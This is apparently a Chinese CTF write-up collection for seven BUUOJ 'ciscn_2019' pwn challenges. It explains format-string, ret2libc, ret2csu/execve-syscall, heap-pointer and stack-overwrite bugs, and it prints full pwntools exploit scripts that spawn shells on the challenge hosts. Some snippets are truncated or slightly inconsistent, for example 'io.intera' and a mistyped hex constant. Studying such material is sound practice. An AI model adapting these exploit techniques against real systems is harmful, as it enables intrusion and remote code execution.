# 0x01.ciscn_2019_sw_1



>   -   当`RELRO`保护为`NO RELRO`的时候，`init.array、fini.array、got.plt`均可读可写；为`PARTIAL RELRO`的时候，`ini.array、fini.array`可读不可写，`got.plt`可读可写；为`FULL RELRO`时，`init.array、fini.array、got.plt`均可读不可写。
>   -   程序在加载的时候，会依次调用`init.array`数组中的每一个函数指针，在结束的时候，依次调用`fini.array`中的每一个函数指针
>   -   当程序出现格式化字符串漏洞，但是需要写两次才能完成攻击，这个时候可以考虑改写`fini.array`中的函数指针为`main`函数地址，可以再执行一次`main`函数。一般来说，这个数组的长度为`1`，也就是说只能写一个地址

32位，开了NX

```sh
yutao@ubuntu:~/Desktop$ checksec ciscn_2019_sw_1
[*] '/home/yutao/Desktop/ciscn_2019_sw_1'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

一眼格式化字符串的洞，且格式化字符串的洞在栈上，比在堆上简单点：

![image-20220412231718491](0x01-0x20/image-20220412231718491.png)

下面测偏移：

```sh
yutao@ubuntu:~/Desktop$ ./ciscn_2019_sw_1 
Welcome to my ctf! What's your name?
aaaa%X.%X.%X.%X.%X.%X.%X.%X.%X.%X.%X.%X.%X.%X.%X.%X.
Hello aaaaFFB76310.2.0.61616161.252E5825.58252E58.2E58252E.252E5825.58252E58.2E58252E.252E5825.58252E58.2E58252E.252E5825.58252E58.2E58252E.yutao@ubuntu:~/Desktop$ 
```

偏移为4.

除此之外还有个sys：

![image-20220412232322442](0x01-0x20/image-20220412232322442.png)



![image-20220412232812407](0x01-0x20/image-20220412232812407.png)

所以，写fini_array的第一个为main的地址，并将printf@got改为system@plt。

```
system.plt: 0x80483D0
fini_array = 0x0804979C
printf.got = 0x0804989C
```



exp:

```python
from pwn import *

p = remote("node4.buuoj.cn",25857)
#p = process("./ciscn_2019_sw_1")

printf_got = 0x0804989C
system_plt = 0x080483D0
fini_array = 0x0804979C
main = 0x8048534
offset = 4
payload = p32(fini_array + 2) + p32(printf_got+2) + p32(printf_got) + p32(fini_array)
payload += "%" + str(0x0804 - 0x10) + "c%4$hn"    
payload += "%5$hn"                               
payload += "%" + str(0x83D0 - 0x0804) + "c%6$hn"  
payload += "%" + str(0x8534 - 0x83D0) + "c%7$hn"  
p.sendlineafter("name?\n",payload)
p.sendlineafter("name?\n",'/bin/sh\x00')
p.interactive()
```

# 0x02.ciscn_2019_s_3

　　32位与64位 系统调用的区别：

>　　　　1. 传参方式不同
>
>　　　　2. 系统调用号 不同
>
>　　　　3. 调用方式 不同

　　32位：

```
传参方式：首先将系统调用号 传入 eax，然后将参数 从左到右 依次存入 ebx，ecx，edx寄存器中，返回值存在eax寄存器

调用号：sys_read 的调用号 为 3 sys_write 的调用号 为 4

调用方式: 使用 int 80h 中断进行系统调用
```

　　64位：

```
传参方式：首先将系统调用号 传入 rax，然后将参数 从左到右 依次存入 rdi，rsi，rdx寄存器中，返回值存在rax寄存器

调用号：sys_read 的调用号 为 0 sys_write 的调用号 为 1

stub_execve 的调用号 为 59 stub_rt_sigreturn 的调用号 为 15

调用方式: 使用 syscall 进行系统调用
```

调用：\$rax\=\=59，\$rdi\=\=“/bin/sh”，\$rsi\=\=0，\$rdx\=\=0

首先往栈上写0x400，然后从栈上读0x30

经过调试发现输入后返回的是写入栈上的位置。

![image-20210511160829045](0x01-0x20/image-20210511160829045.png)

将0x00007ffe7d621e58减去0x00007ffe7d621d40得到0x118（固定）

所以经过recv的地址减去0x118就是写入/bin/sh的地址

有个gadgets函数：

![image-20210511161319133](0x01-0x20/image-20210511161319133.png)

其中的0x3B就是59，系统调用，

> hex(0x00007ffe7d621e58 - 0x7ffe7d621d40)
> '0x118'

![image-20210511162201775](0x01-0x20/image-20210511162201775.png)

r12是将要执行的地址。

```python
from pwn import *
io = remote('node3.buuoj.cn',26613)
#io = process("./ciscn_s_3")
vulun_addr = 0x4004ED
mov_rax = 0x4004E2
pop_rbx_rbp_r12= 0x40059a
mov_call = 0x400580
sys_call = 0x400517
pop_rdi = 0x04005a3

payload = b"/bin/sh\x00"*2 + p64(vulun_addr)
io.send(payload)
io.recv(0x20)

bin_sh_add = u64(io.recv(8))-0x118
payload = b"/bin/sh\x00"*2 + p64(pop_rbx_rbp_r12)+p64(0)*2+ p64(bin_sh_add+0x50) + p64(0)*3

payload +=  p64(mov_call)+p64(mov_rax) +p64(pop_rdi)+ p64(bin_sh_add) + p64(sys_call)

io.sendline(payload)

io.interactive()
```



# 0x03.ciscn_2019_n_3

new()中，分为两种type，一种是整形，一种是字符串，字符串的话将地址放在chunk中。

分配的0x10的有8byte写了两个函数的地址。（str_printf和str_free）

所以直接将free的地址改为system然后执行就OK。

这道题第一开始一直没太搞懂。

![image-20210512205816626](0x01-0x20/image-20210512205816626.png)

他delete了1和2之后，bin中有了两个，再下来new3 写入的时候，首先是malloc了1e0的那个位置，之后存放的地址是1a0那里，一直以为是1f0的位置。。。所以写入的sh+system的地址是1a0。

还有就是为什么sh的地址是1a0，可以这样查看，![image-20210512210029878](0x01-0x20/image-20210512210029878.png)

exp：

```python
from pwn import *

p = process("./ciscn_2019_n_3")
context.log_level = 'debug'
elf = ELF("ciscn_2019_n_3")
def newnote(idx,type,value,length=0):
    p.recvuntil("CNote > ")
    p.sendline(str(1))
    p.recvuntil("Index > ")
    p.sendline(str(idx))
    p.recvuntil("Type > ")
    p.sendline(str(type))
    if type == 1:
        p.recvuntil("Value > ")
        p.sendline(str(value))
    else:
            p.recvuntil("Length > ")
            p.sendline(str(length))
            p.recvuntil("Value > ")
            if length == 8:
                p.send(value)
            else:
                p.sendline(value)
def delnote(idx):
    p.recvuntil("CNote > ")
    p.sendline(str(2))
    p.recvuntil("Index > ")
    p.sendline(str(idx))
def shownote(idx):
    p.recvuntil("CNote > ")
    p.sendline(str(3))
    p.recvuntil("Index > ")
    p.sendline(str(idx))

newnote(0,2,'a'*0x10,0x2c)
newnote(1,2,'b'*0x10,0x2c)
newnote(2,2,'c'*0x10,0x2c)

delnote(1)
delnote(2)
#gdb.attach(p)
newnote(3,2,'sh\x00\x00'+ p32(elf.plt['system']),0xc)
gdb.attach(p)
delnote(1)

p.interactive()
```

# 0x04.ciscn_2019_n_1

>   其实就是 计组的东西，，

```
yutao@pwnbaby:~/Desktop$ file ciscn_2019_n_1 
ciscn_2019_n_1: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=8a733f5404b1e2c65e1758c7d92821eb8490f7c5, not stripped
yutao@pwnbaby:~/Desktop$ checksec ciscn_2019_n_1
[*] '/home/yutao/Desktop/ciscn_2019_n_1'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)

```

有个func()函数，输入的是v1，但是比较的是v2，将v2改为11.28125就OK

浮点数改为十六进制的话有脚本可以跑，下面说一下具体是怎么实现的。

首先11.28125转二进制的话是1011.01001。单精度浮点数是4个字节，也就是32位。

其中最高位是符号位，0为正，1为负。

接下来的8位是指数位。剩下的23位是尾数部分。

1011.01001 ==  1011.01001\*2^0  ==  1.01101001\*2^3

所以指数位就是（127+指数(3) ）的二进制表示，也就是1000 0010，至于为什么是127，规定。。

连起来就是01000001001101001000000000000000，十六进制表示就是0x4134800。

所以将v2覆盖为上面的值就OK。

exp：

```python
from pwn import *
#io = process("./ciscn_2019_n_1")
io = remote("node3.buuoj.cn", 26204)
payload = b'a'*(0x30-4) + p64(0x41348000)
io.send(payload)
io.intera
```

# 0x05.ciscn_2019_c_1

```
yutao@pwnbaby:~/Desktop$ file ciscn_2019_c_1 
ciscn_2019_c_1: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=06ddf49af2b8c7ed708d3cfd8aec8757bca82544, not stripped
yutao@pwnbaby:~/Desktop$ checksec ciscn_2019_c_1
[*] '/home/yutao/Desktop/ciscn_2019_c_1'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

程序的漏洞在encrypt()函数里面，可以发现在gets时，存在栈溢出的漏洞，这题并没有后门函数，但有puts函数，可以用来泄露libc版本并构造ROP链。

在\_\_libc\_csu\_init()函数的最后有个pop rdi,ret，可以用来构造ROP。

如果输入的字符串太少是不会进行加密的，

程序刚运行：

```
pwndbg> x/gx 0x6020ac
0x6020ac <x>:	0x0000000000000000
```

进行一次加密后：

```
pwndbg> x/gx 0x6020ac
0x6020ac <x>:	0x000000000000005b
```

我们构造的payload是120，满足需要加密的条件。

exp1：

```python
from pwn import *
from LibcSearcher import LibcSearcher
context.log_level = "debug"
# io = process('./ciscn_2019_c_1')
io = remote('node3.buuoj.cn','29497')
e = ELF('./ciscn_2019_c_1')

pop_rdi = 0x400c83
ret_addr = 0x4006b9#这里是用来平等栈的，因为题目环境是Ubuntu18
#Ubuntu18调用system时要对齐栈，需要加一个ret来平衡，否则会crash。
puts_plt = e.plt['puts']
puts_got = e.got['puts']


payload = 0x58*'a' + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(e.symbols['main'])
io.sendlineafter("your choice!\n","1")
io.sendlineafter("to be encrypted\n",payload)

io.recvuntil("Ciphertext\n")
io.recvline()

puts_addr = u64(io.recv(6).ljust(8, '\x00'))
libc = LibcSearcher('puts', puts_addr)
libc_base = puts_addr - libc.dump('puts')
system_addr = libc_base + libc.dump('system')
binsh_addr = libc_base + libc.dump('str_bin_sh')
io.sendlineafter("your choice!\n","1")
# gdb.attach(io)
payload = 0x58 * 'a' + p64(ret_addr) +p64(pop_rdi) + p64(binsh_addr) + p64(system_addr)
# 也可以多加几个ret，看出栈对齐的字节数。
io.sendlineafter("to be encrypted\n",payload)
io.recvuntil("Ciphertext\n")
io.recvline()
io.sendline('/bin/sh')
io.sendline(payload)
io.interactive()
```

也有另一种绕过加密的方法，就是让v0>=strlen(s)，我们可以让strlen(s)的长度为0，也就是让字符串的第一个字符为“\x00”，那样strlen函数读取到第一个字符串就会终止，就可以绕过加密。

exp2：

```python
from pwn import*
from LibcSearcher import *
context.log_level = 'debug'
#io = remote("node3.buuoj.cn" , 27728)
elf = ELF("./ciscn_2019_c_1")
io = process("./ciscn_2019_c_1")

puts_plt =elf.plt["puts"]
puts_got= elf.got["puts"]
pop_rid_ret = 0x400c83
main_addr = 0x400b28

io.recvuntil("Welcome to this Encryption machine\n")
io.sendline('1')

payload1 = b"\x00" + b"A"*(80 - 1 + 8) + p64(pop_rid_ret) + p64(puts_got) + p64(puts_plt) + p64(main_addr)
io.recvuntil("Input your Plaintext to be encrypted")
io.sendline(payload1)

io.recv()
io.recvuntil('\n\n')
puts_addr = io.recvuntil('\n',True)
puts_addr = u64(puts_addr.ljust(8,b'\x00'))
#puts_addr = puts_addr.ljust(8,b'\x00')
print("------------------->",hex(puts_addr))

libc = LibcSearcher('puts',puts_addr)
sys_libc = libc.dump('system')
bin_sh_libc = libc.dump('str_bin_sh')
puts_libc = libc.dump('puts')
retn = 0x4006B9

sys_addr = puts_addr + (sys_libc - puts_libc)
bin_addr = puts_addr + (bin_sh_libc - puts_libc)

io.recvuntil("Welcome to this Encryption machine\n")
io.sendline('1')

io.recvuntil("Input your Plaintext to be encrypted")
payload2 = b"\x00" + b"A"*(80 - 1 + 8) + p64(retn) + p64(pop_rid_ret) + p64(bin_addr) + p64(sys_addr) + b'A'*8
io.sendline(payload2)

io.interactive()
```

还有一种，就是老老实实的按照加密的思路写payload。

exp3：

```python
from pwn import *
from LibcSearcher import *


def encrypt(s):
    newstr = list(s)
    for i in range(len(newstr)):
        c = ord(s[i])
        if c <= 96 or c > 122:
            if c <= 64 or c > 90:
                if c > 47 and c <= 57:
                    c ^= 0xF
            else:
               c ^= 0xE
        else:
            c ^= 0xD
        newstr[i] = chr(c)
    return ''.join(newstr)

elf = ELF('./ciscn_2019_c_1')
#p = process('./ciscn_2019_c_1')
p = remote('node3.buuoj.cn',29497)

start = 0x400B28
rdi_addr = 0x400c83
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
p.sendlineafter("choice!",'1')

payload="a"*0x58
payload+=p64(rdi_addr)
payload+=p64(puts_got)
payload+=p64(puts_plt)
payload+=p64(start)
p.sendlineafter("encrypted",encrypt(payload))
p.recvuntil('Ciphertext\n')
p.recvuntil('\n')
puts_leak = u64(p.recvuntil('\n', drop=True).ljust(8,'\x00'))
log.success('puts_addr = ' + hex(puts_leak))
libc = LibcSearcher('puts', puts_leak)
libc_base = puts_leak - libc.dump('puts')
sys_addr = libc_base + libc.dump('system')
bin_sh_addr = libc_base + libc.dump('str_bin_sh')
payload1="a"*0x58
ret = 0x4006b9
payload1+=p64(ret)
payload1+=p64(rdi_addr)
payload1+=p64(bin_sh_addr)
payload1+=p64(sys_addr)
p.sendlineafter("choice!",'1')
p.sendlineafter("encrypted",payload1)
p.interactive()
```

还有一种写法，ret2csu也可。

# 0x06.ciscn_2019_en_2

和ciscn_2019_c_1是一模一样的...

ret2libc.

```python
from pwn import *
from LibcSearcher import *
context(log_level='DEBUG')
#io = process("./ciscn_2019_en_2")
io = remote('node3.buuoj.cn',29045)
elf = ELF("./ciscn_2019_en_2")
ret = 0x04006b9
pop_rdi_ret = 0x0400c83
main = 0x400B28

puts_plt = elf.plt['puts']
puts_got = elf.got['puts']

payload = 0x58 * 'a'+ p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+ p64(main)

io.recvuntil("choice!")
io.sendline("1")
io.recvuntil("encrypted")
io.sendline(payload)
io.recvuntil("Ciphertext")
io.recvline()
io.recvline()
puts_addr =u64(io.recvuntil("\n")[:-1].ljust(8,'\0'))

libc = LibcSearcher("puts",puts_addr)
base = puts_addr - libc.dump('puts')
system_addr = base + libc.dump("system")
bin_sh = base + libc.dump('str_bin_sh')

payload = 0x58*'a'+p64(ret)+p64(pop_rdi_ret) +p64(bin_sh)+ p64(system_addr)
#Ubuntu18调用system时要ret，不然会crash
#栈对齐
io.sendline('1')
io.recvuntil("encrypted")
io.sendline(payload)
io.interactive()

#gdb.attach(io)
```

# 0x07.ciscn_2019_n_8

```
yutao@pwnbaby:~/Desktop$ checksec ciscn_2019_n_8
[*] '/home/yutao/Desktop/ciscn_2019_n_8'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [esp-14h] [ebp-20h]
  int v5; // [esp-10h] [ebp-1Ch]

  var[13] = 0;
  var[14] = 0;
  init();
  puts("What's your name?");
  __isoc99_scanf("%s", var, v4, v5);
  if ( *&var[13] )
  {
    if ( *&var[13] == 17LL )
      system("/bin/sh");
    else
      printf(
        "something wrong! val is %d",
        var[0],
        var[1],
        var[2],
        var[3],
        var[4],
        var[5],
        var[6],
        var[7],
        var[8],
        var[9],
        var[10],
        var[11],
        var[12],
        var[13],
        var[14]);
  }
  else
  {
    printf("%s, Welcome!\n", var);
    puts("Try do something~");
  }
  return 0;
}
```

所以payload：

```python
from pwn import *
context(log_level='DEBUG')
#io = process("./ciscn_2019_n_8")
io = remote('node3.buuoj.cn',29560 )
io.recv() 
payload = p32(17) * 14
io.sendline(payload)
io.interactive()
```

